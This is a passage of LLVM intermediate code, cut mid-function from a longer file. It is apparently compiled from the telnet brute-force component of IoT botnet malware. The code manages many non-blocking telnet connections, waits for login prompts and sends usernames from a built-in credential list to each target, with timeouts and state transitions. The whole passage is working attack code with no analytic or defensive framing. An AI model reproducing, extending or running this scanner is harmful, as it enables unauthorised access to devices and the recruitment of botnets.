  %268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %267
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %268, i32 0, i32 0
  %270 = load i32, i32* %269, align 16
  %271 = srem i32 %270, 64
  %272 = zext i32 %271 to i64
  %273 = shl i64 1, %272
  %274 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %4, i32 0, i32 0
  %275 = load i32, i32* %2, align 4
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %276
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %277, i32 0, i32 0
  %279 = load i32, i32* %278, align 16
  %280 = sdiv i32 %279, 64
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds [16 x i64], [16 x i64]* %274, i64 0, i64 %281
  %283 = load i64, i64* %282, align 8
  %284 = or i64 %283, %273
  store i64 %284, i64* %282, align 8
  %285 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %285, align 8
  %286 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %286, align 8
  %287 = load i32, i32* %2, align 4
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %288
  %290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %289, i32 0, i32 0
  %291 = load i32, i32* %290, align 16
  %292 = add nsw i32 %291, 1
  %293 = call i32 @select(i32 %292, %struct.fd_set* null, %struct.fd_set* %4, %struct.fd_set* null, %struct.timeval* %5)
  store i32 %293, i32* %3, align 4
  %294 = load i32, i32* %3, align 4
  %295 = icmp eq i32 %294, 1
  br i1 %295, label %296, label %353

296:                                              ; preds = %265
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %297 = load i32, i32* %2, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %298
  %300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %299, i32 0, i32 0
  %301 = load i32, i32* %300, align 16
  %302 = bitcast i32* %7 to i8*
  %303 = call i32 @getsockopt(i32 %301, i32 1, i32 4, i8* %302, i32* %6) #12
  %304 = load i32, i32* %7, align 4
  %305 = icmp ne i32 %304, 0
  br i1 %305, label %306, label %321

306:                                              ; preds = %296
  %307 = load i32, i32* %2, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %308
  %310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %309, i32 0, i32 0
  %311 = load i32, i32* %310, align 16
  %312 = call i32 @sclose(i32 %311)
  %313 = load i32, i32* %2, align 4
  %314 = sext i32 %313 to i64
  %315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %314
  %316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %315, i32 0, i32 2
  store i8 0, i8* %316, align 8
  %317 = load i32, i32* %2, align 4
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %318
  %320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %319, i32 0, i32 3
  store i8 1, i8* %320, align 1
  br label %352

321:                                              ; preds = %296
  %322 = load i32, i32* %2, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %323
  %325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %324, i32 0, i32 0
  %326 = load i32, i32* %325, align 16
  %327 = load i32, i32* %2, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %328
  %330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %329, i32 0, i32 0
  %331 = load i32, i32* %330, align 16
  %332 = call i32 (i32, i32, ...) @fcntl(i32 %331, i32 3, i8* null)
  %333 = and i32 %332, -2049
  %334 = call i32 (i32, i32, ...) @fcntl(i32 %326, i32 4, i32 %333)
  %335 = load i32, i32* %2, align 4
  %336 = sext i32 %335 to i64
  %337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %336
  %338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %337, i32 0, i32 6
  store i32 0, i32* %338, align 4
  %339 = load i32, i32* %2, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %340
  %342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %341, i32 0, i32 7
  store i16 0, i16* %342, align 16
  %343 = load i32, i32* %2, align 4
  %344 = sext i32 %343 to i64
  %345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %344
  %346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %345, i32 0, i32 8
  %347 = load i8*, i8** %346, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %347, i8 0, i64 1024, i1 false)
  %348 = load i32, i32* %2, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %349
  %351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %350, i32 0, i32 2
  store i8 2, i8* %351, align 8
  br label %2311

352:                                              ; preds = %306
  br label %372

353:                                              ; preds = %265
  %354 = load i32, i32* %3, align 4
  %355 = icmp eq i32 %354, -1
  br i1 %355, label %356, label %371

356:                                              ; preds = %353
  %357 = load i32, i32* %2, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %358
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %359, i32 0, i32 0
  %361 = load i32, i32* %360, align 16
  %362 = call i32 @sclose(i32 %361)
  %363 = load i32, i32* %2, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %364
  %366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %365, i32 0, i32 2
  store i8 0, i8* %366, align 8
  %367 = load i32, i32* %2, align 4
  %368 = sext i32 %367 to i64
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %368
  %370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %369, i32 0, i32 3
  store i8 1, i8* %370, align 1
  br label %371

371:                                              ; preds = %356, %353
  br label %372

372:                                              ; preds = %371, %352
  %373 = load i32, i32* %2, align 4
  %374 = sext i32 %373 to i64
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %374
  %376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %375, i32 0, i32 6
  %377 = load i32, i32* %376, align 4
  %378 = add i32 %377, 10
  %379 = zext i32 %378 to i64
  %380 = call i64 @time(i64* null) #12
  %381 = icmp slt i64 %379, %380
  br i1 %381, label %382, label %397

382:                                              ; preds = %372
  %383 = load i32, i32* %2, align 4
  %384 = sext i32 %383 to i64
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %384
  %386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %385, i32 0, i32 0
  %387 = load i32, i32* %386, align 16
  %388 = call i32 @sclose(i32 %387)
  %389 = load i32, i32* %2, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %390
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %391, i32 0, i32 2
  store i8 0, i8* %392, align 8
  %393 = load i32, i32* %2, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %394
  %396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %395, i32 0, i32 3
  store i8 1, i8* %396, align 1
  br label %397

397:                                              ; preds = %382, %372
  br label %2310

398:                                              ; preds = %70
  %399 = load i32, i32* %2, align 4
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %400
  %402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %401, i32 0, i32 6
  %403 = load i32, i32* %402, align 4
  %404 = icmp eq i32 %403, 0
  br i1 %404, label %405, label %412

405:                                              ; preds = %398
  %406 = call i64 @time(i64* null) #12
  %407 = trunc i64 %406 to i32
  %408 = load i32, i32* %2, align 4
  %409 = sext i32 %408 to i64
  %410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %409
  %411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %410, i32 0, i32 6
  store i32 %407, i32* %411, align 4
  br label %412

412:                                              ; preds = %405, %398
  %413 = load i32, i32* %2, align 4
  %414 = sext i32 %413 to i64
  %415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %414
  %416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %415, i32 0, i32 0
  %417 = load i32, i32* %416, align 16
  %418 = load i32, i32* %2, align 4
  %419 = sext i32 %418 to i64
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %419
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %420, i32 0, i32 8
  %422 = load i8*, i8** %421, align 8
  %423 = load i32, i32* %2, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %424
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %425, i32 0, i32 7
  %427 = load i16, i16* %426, align 16
  %428 = zext i16 %427 to i32
  %429 = call i32 @readUntil(i32 %417, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %422, i32 1024, i32 %428)
  %430 = icmp ne i32 %429, 0
  br i1 %430, label %431, label %463

431:                                              ; preds = %412
  %432 = load i32, i32* %2, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %433
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %434, i32 0, i32 6
  store i32 0, i32* %435, align 4
  %436 = load i32, i32* %2, align 4
  %437 = sext i32 %436 to i64
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %437
  %439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %438, i32 0, i32 7
  store i16 0, i16* %439, align 16
  %440 = load i32, i32* %2, align 4
  %441 = sext i32 %440 to i64
  %442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %441
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %442, i32 0, i32 8
  %444 = load i8*, i8** %443, align 8
  %445 = call i8* @strstr(i8* %444, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #11
  %446 = icmp ne i8* %445, null
  br i1 %446, label %447, label %452

447:                                              ; preds = %431
  %448 = load i32, i32* %2, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %449
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %450, i32 0, i32 2
  store i8 5, i8* %451, align 8
  br label %458

452:                                              ; preds = %431
  %453 = load i32, i32* %2, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %454
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %455, i32 0, i32 8
  %457 = load i8*, i8** %456, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %457, i8 0, i64 1024, i1 false)
  br label %458

458:                                              ; preds = %452, %447
  %459 = load i32, i32* %2, align 4
  %460 = sext i32 %459 to i64
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %460
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %461, i32 0, i32 2
  store i8 3, i8* %462, align 8
  br label %2311

463:                                              ; preds = %412
  %464 = load i32, i32* %2, align 4
  %465 = sext i32 %464 to i64
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %465
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %466, i32 0, i32 0
  %468 = load i32, i32* %467, align 16
  %469 = load i32, i32* %2, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %470
  %472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %471, i32 0, i32 8
  %473 = load i8*, i8** %472, align 8
  %474 = load i32, i32* %2, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %475
  %477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %476, i32 0, i32 7
  %478 = load i16, i16* %477, align 16
  %479 = zext i16 %478 to i32
  %480 = call i32 @readUntil(i32 %468, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %473, i32 1024, i32 %479)
  %481 = icmp ne i32 %480, 0
  br i1 %481, label %482, label %514

482:                                              ; preds = %463
  %483 = load i32, i32* %2, align 4
  %484 = sext i32 %483 to i64
  %485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %484
  %486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %485, i32 0, i32 6
  store i32 0, i32* %486, align 4
  %487 = load i32, i32* %2, align 4
  %488 = sext i32 %487 to i64
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %488
  %490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %489, i32 0, i32 7
  store i16 0, i16* %490, align 16
  %491 = load i32, i32* %2, align 4
  %492 = sext i32 %491 to i64
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %492
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %493, i32 0, i32 8
  %495 = load i8*, i8** %494, align 8
  %496 = call i8* @strstr(i8* %495, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #11
  %497 = icmp ne i8* %496, null
  br i1 %497, label %498, label %503

498:                                              ; preds = %482
  %499 = load i32, i32* %2, align 4
  %500 = sext i32 %499 to i64
  %501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %500
  %502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %501, i32 0, i32 2
  store i8 5, i8* %502, align 8
  br label %509

503:                                              ; preds = %482
  %504 = load i32, i32* %2, align 4
  %505 = sext i32 %504 to i64
  %506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %505
  %507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %506, i32 0, i32 8
  %508 = load i8*, i8** %507, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %508, i8 0, i64 1024, i1 false)
  br label %509

509:                                              ; preds = %503, %498
  %510 = load i32, i32* %2, align 4
  %511 = sext i32 %510 to i64
  %512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %511
  %513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %512, i32 0, i32 2
  store i8 3, i8* %513, align 8
  br label %2311

514:                                              ; preds = %463
  %515 = load i32, i32* %2, align 4
  %516 = sext i32 %515 to i64
  %517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %516
  %518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %517, i32 0, i32 0
  %519 = load i32, i32* %518, align 16
  %520 = load i32, i32* %2, align 4
  %521 = sext i32 %520 to i64
  %522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %521
  %523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %522, i32 0, i32 8
  %524 = load i8*, i8** %523, align 8
  %525 = load i32, i32* %2, align 4
  %526 = sext i32 %525 to i64
  %527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %526
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %527, i32 0, i32 7
  %529 = load i16, i16* %528, align 16
  %530 = zext i16 %529 to i32
  %531 = call i32 @readUntil(i32 %519, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %524, i32 1024, i32 %530)
  %532 = icmp ne i32 %531, 0
  br i1 %532, label %533, label %565

533:                                              ; preds = %514
  %534 = load i32, i32* %2, align 4
  %535 = sext i32 %534 to i64
  %536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %535
  %537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %536, i32 0, i32 6
  store i32 0, i32* %537, align 4
  %538 = load i32, i32* %2, align 4
  %539 = sext i32 %538 to i64
  %540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %539
  %541 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %540, i32 0, i32 7
  store i16 0, i16* %541, align 16
  %542 = load i32, i32* %2, align 4
  %543 = sext i32 %542 to i64
  %544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %543
  %545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %544, i32 0, i32 8
  %546 = load i8*, i8** %545, align 8
  %547 = call i8* @strstr(i8* %546, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #11
  %548 = icmp ne i8* %547, null
  br i1 %548, label %549, label %554

549:                                              ; preds = %533
  %550 = load i32, i32* %2, align 4
  %551 = sext i32 %550 to i64
  %552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %551
  %553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %552, i32 0, i32 2
  store i8 5, i8* %553, align 8
  br label %560

554:                                              ; preds = %533
  %555 = load i32, i32* %2, align 4
  %556 = sext i32 %555 to i64
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %556
  %558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %557, i32 0, i32 8
  %559 = load i8*, i8** %558, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %559, i8 0, i64 1024, i1 false)
  br label %560

560:                                              ; preds = %554, %549
  %561 = load i32, i32* %2, align 4
  %562 = sext i32 %561 to i64
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %562
  %564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %563, i32 0, i32 2
  store i8 3, i8* %564, align 8
  br label %2311

565:                                              ; preds = %514
  %566 = load i32, i32* %2, align 4
  %567 = sext i32 %566 to i64
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %567
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %568, i32 0, i32 0
  %570 = load i32, i32* %569, align 16
  %571 = load i32, i32* %2, align 4
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %572
  %574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %573, i32 0, i32 8
  %575 = load i8*, i8** %574, align 8
  %576 = load i32, i32* %2, align 4
  %577 = sext i32 %576 to i64
  %578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %577
  %579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %578, i32 0, i32 7
  %580 = load i16, i16* %579, align 16
  %581 = zext i16 %580 to i32
  %582 = call i32 @readUntil(i32 %570, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %575, i32 1024, i32 %581)
  %583 = icmp ne i32 %582, 0
  br i1 %583, label %584, label %616

584:                                              ; preds = %565
  %585 = load i32, i32* %2, align 4
  %586 = sext i32 %585 to i64
  %587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %586
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %587, i32 0, i32 6
  store i32 0, i32* %588, align 4
  %589 = load i32, i32* %2, align 4
  %590 = sext i32 %589 to i64
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %590
  %592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %591, i32 0, i32 7
  store i16 0, i16* %592, align 16
  %593 = load i32, i32* %2, align 4
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %594
  %596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %595, i32 0, i32 8
  %597 = load i8*, i8** %596, align 8
  %598 = call i8* @strstr(i8* %597, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #11
  %599 = icmp ne i8* %598, null
  br i1 %599, label %600, label %605

600:                                              ; preds = %584
  %601 = load i32, i32* %2, align 4
  %602 = sext i32 %601 to i64
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %602
  %604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %603, i32 0, i32 2
  store i8 5, i8* %604, align 8
  br label %611

605:                                              ; preds = %584
  %606 = load i32, i32* %2, align 4
  %607 = sext i32 %606 to i64
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %607
  %609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %608, i32 0, i32 8
  %610 = load i8*, i8** %609, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %610, i8 0, i64 1024, i1 false)
  br label %611

611:                                              ; preds = %605, %600
  %612 = load i32, i32* %2, align 4
  %613 = sext i32 %612 to i64
  %614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %613
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %614, i32 0, i32 2
  store i8 3, i8* %615, align 8
  br label %2311

616:                                              ; preds = %565
  %617 = load i32, i32* %2, align 4
  %618 = sext i32 %617 to i64
  %619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %618
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %619, i32 0, i32 0
  %621 = load i32, i32* %620, align 16
  %622 = load i32, i32* %2, align 4
  %623 = sext i32 %622 to i64
  %624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %623
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %624, i32 0, i32 8
  %626 = load i8*, i8** %625, align 8
  %627 = load i32, i32* %2, align 4
  %628 = sext i32 %627 to i64
  %629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %628
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %629, i32 0, i32 7
  %631 = load i16, i16* %630, align 16
  %632 = zext i16 %631 to i32
  %633 = call i32 @readUntil(i32 %621, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %626, i32 1024, i32 %632)
  %634 = icmp ne i32 %633, 0
  br i1 %634, label %635, label %667

635:                                              ; preds = %616
  %636 = load i32, i32* %2, align 4
  %637 = sext i32 %636 to i64
  %638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %637
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %638, i32 0, i32 6
  store i32 0, i32* %639, align 4
  %640 = load i32, i32* %2, align 4
  %641 = sext i32 %640 to i64
  %642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %641
  %643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %642, i32 0, i32 7
  store i16 0, i16* %643, align 16
  %644 = load i32, i32* %2, align 4
  %645 = sext i32 %644 to i64
  %646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %645
  %647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %646, i32 0, i32 8
  %648 = load i8*, i8** %647, align 8
  %649 = call i8* @strstr(i8* %648, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #11
  %650 = icmp ne i8* %649, null
  br i1 %650, label %651, label %656

651:                                              ; preds = %635
  %652 = load i32, i32* %2, align 4
  %653 = sext i32 %652 to i64
  %654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %653
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %654, i32 0, i32 2
  store i8 5, i8* %655, align 8
  br label %662

656:                                              ; preds = %635
  %657 = load i32, i32* %2, align 4
  %658 = sext i32 %657 to i64
  %659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %658
  %660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %659, i32 0, i32 8
  %661 = load i8*, i8** %660, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %661, i8 0, i64 1024, i1 false)
  br label %662

662:                                              ; preds = %656, %651
  %663 = load i32, i32* %2, align 4
  %664 = sext i32 %663 to i64
  %665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %664
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %665, i32 0, i32 2
  store i8 3, i8* %666, align 8
  br label %2311

667:                                              ; preds = %616
  %668 = load i32, i32* %2, align 4
  %669 = sext i32 %668 to i64
  %670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %669
  %671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %670, i32 0, i32 8
  %672 = load i8*, i8** %671, align 8
  %673 = call i64 @strlen(i8* %672) #11
  %674 = trunc i64 %673 to i16
  %675 = load i32, i32* %2, align 4
  %676 = sext i32 %675 to i64
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %676
  %678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %677, i32 0, i32 7
  store i16 %674, i16* %678, align 16
  br label %679

679:                                              ; preds = %667
  br label %680

680:                                              ; preds = %679
  br label %681

681:                                              ; preds = %680
  br label %682

682:                                              ; preds = %681
  br label %683

683:                                              ; preds = %682
  %684 = load i32, i32* %2, align 4
  %685 = sext i32 %684 to i64
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %685
  %687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %686, i32 0, i32 6
  %688 = load i32, i32* %687, align 4
  %689 = add i32 %688, 10
  %690 = zext i32 %689 to i64
  %691 = call i64 @time(i64* null) #12
  %692 = icmp slt i64 %690, %691
  br i1 %692, label %693, label %708

693:                                              ; preds = %683
  %694 = load i32, i32* %2, align 4
  %695 = sext i32 %694 to i64
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %695
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %696, i32 0, i32 0
  %698 = load i32, i32* %697, align 16
  %699 = call i32 @sclose(i32 %698)
  %700 = load i32, i32* %2, align 4
  %701 = sext i32 %700 to i64
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %701
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %702, i32 0, i32 2
  store i8 0, i8* %703, align 8
  %704 = load i32, i32* %2, align 4
  %705 = sext i32 %704 to i64
  %706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %705
  %707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %706, i32 0, i32 3
  store i8 1, i8* %707, align 1
  br label %708

708:                                              ; preds = %693, %683
  br label %2310

709:                                              ; preds = %70
  %710 = load i32, i32* %2, align 4
  %711 = sext i32 %710 to i64
  %712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %711
  %713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %712, i32 0, i32 0
  %714 = load i32, i32* %713, align 16
  %715 = load i32, i32* %2, align 4
  %716 = sext i32 %715 to i64
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %716
  %718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %717, i32 0, i32 4
  %719 = load i8, i8* %718, align 2
  %720 = zext i8 %719 to i64
  %721 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %720
  %722 = load i8*, i8** %721, align 8
  %723 = load i32, i32* %2, align 4
  %724 = sext i32 %723 to i64
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %724
  %726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %725, i32 0, i32 4
  %727 = load i8, i8* %726, align 2
  %728 = zext i8 %727 to i64
  %729 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %728
  %730 = load i8*, i8** %729, align 8
  %731 = call i64 @strlen(i8* %730) #11
  %732 = call i64 @send(i32 %714, i8* %722, i64 %731, i32 16384)
  %733 = icmp slt i64 %732, 0
  br i1 %733, label %734, label %749

734:                                              ; preds = %709
  %735 = load i32, i32* %2, align 4
  %736 = sext i32 %735 to i64
  %737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %736
  %738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %737, i32 0, i32 0
  %739 = load i32, i32* %738, align 16
  %740 = call i32 @sclose(i32 %739)
  %741 = load i32, i32* %2, align 4
  %742 = sext i32 %741 to i64
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %742
